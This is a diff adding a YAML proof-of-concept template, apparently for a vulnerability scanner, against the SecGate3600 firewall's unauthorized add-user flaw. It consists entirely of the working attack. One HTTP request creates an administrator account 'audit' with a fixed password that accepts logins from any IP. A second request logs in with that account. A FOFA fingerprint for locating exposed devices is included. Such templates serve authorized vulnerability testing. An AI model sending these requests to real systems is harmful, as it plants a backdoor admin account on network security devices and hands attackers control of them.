@@ -1,0 +1,25 @@
+id: poc-yaml-secgate3600-a1500-unauthorized-add-user
+info:
+  name: 网神SecGate3600未授权添加用户漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 网神SecGate3600
+  fofa: sec_gate_image/button_normal.gif
+requests:
+- method: POST
+  path: /cgi-bin/authUser/authManageSet.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+  data: type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y
+  expression: "status_code == 200 && \ncontains(body,\"<msg>0</msg>\")\n"
+- method: POST
+  path: /cgi-bin/index.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+  data: type=loginCheck&user=audit&pwd=audit%401234
+  expression: "status_code == 200 && \ncontains(body,\"<msg>0</msg>\")\n"
+variables: {}
+transport: http
